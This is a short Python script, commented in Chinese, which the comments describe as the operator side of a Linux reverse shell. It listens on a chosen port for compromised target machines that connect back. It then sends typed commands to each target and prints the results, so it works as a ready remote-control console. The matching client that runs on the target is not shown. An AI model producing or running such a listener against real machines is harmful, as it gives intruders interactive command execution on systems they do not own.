# -*- coding: utf-8 -*-
"""
基于Linux的反向：就是让目标机器来主动连接我们。我作为服务端，目标机器作为client
这个文件放在本机
"""


import socket
import sys
from optparse import OptionParser


def server_rever_linux(port):
    host = ''  # 如果是本机最为服务端，地址可以不用填写
    BUFSIZE = 10240
    ADDR = (host, int(port))
    tcp_server = socket.socket()  # type默认是tcp
    tcp_server.bind(ADDR)
    tcp_server.listen(5)
    print("开始监听...")

    while True:
        # 服务端和客户端的循环连接
        print("Waiting for connecting...")
        coon, addr = tcp_server.accept()
        print("... connected from:" + str(addr))
        # 下面是通信的循环
        while True:
            msg = input('>>>')
            if msg:
                try:
                    coon.send(msg.encode('utf-8'))
                    data = coon.recv(BUFSIZE)
                    if data:
                        print(data.decode('utf-8'))
                    else:
                        print("客户端{}已断开".format(addr))
                        break
                except Exception as e:
                    print(e)
                    continue
            else:
                break


if __name__ == '__main__':
    parser = OptionParser()
    # actions 有一组固定的值可供选择，默认是’store‘，表示将命令行参数值保存在 options 对象里。
    parser.add_option("-p", "--port", dest="port", help="the ports same with client's")
    # 取值
    (options, args) = parser.parse_args()

    if options.port:
        server_rever_linux(options.port)
    else:
        # 自带的帮助信息打印
        parser.print_help()
        sys.exit(1)
